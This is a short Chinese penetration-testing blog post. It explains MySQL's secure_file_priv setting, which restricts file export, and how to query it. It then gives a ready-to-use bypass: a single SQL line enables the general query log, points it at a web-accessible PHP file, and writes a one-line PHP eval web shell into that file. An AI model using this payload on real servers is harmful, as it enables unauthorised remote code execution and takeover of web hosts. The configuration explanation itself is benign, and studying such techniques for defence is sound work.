---
title: MYSQL新特性限制文件写入及替代方法
date: 2018-08-17 10:00:04
tags:
	- Mysql
	- 渗透测试
categories: 渗透测试
keywords:
description:
---
高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限<!-- more -->

## secure_file_priv选项

```
secure_file_priv 

　　1、限制mysqld 不允许导入 | 导出
　   　   --secure_file_prive=null

　　2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下
　　　   --secure_file_priv=/tmp/

　　3、不对mysqld 的导入 | 导出做限制
              --secure_file_priv= 

linux
cat /etc/my.cnf
　　　　[mysqld]
　　　　secure_file_priv= 

win
    my.ini
       [mysqld]
 　　　　secure_file_priv=
```
## 查看secure_file_priv

```
show global variables like '%secure%';
```

## 高权限注入遇到secure_file_priv
在mysql高版本的配置文件中默认没有secure_file_priv这个选项，但是你用SQL语句来查看secure_file_priv发现，没配置这个选项就是NULL，也就是说无法导出文件。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql034.png)

替代方法：

```
set global general_log=on;set global general_log_file='D://www//zzb.php';select '<?php eval($_POST[zzb]) ?>';
```
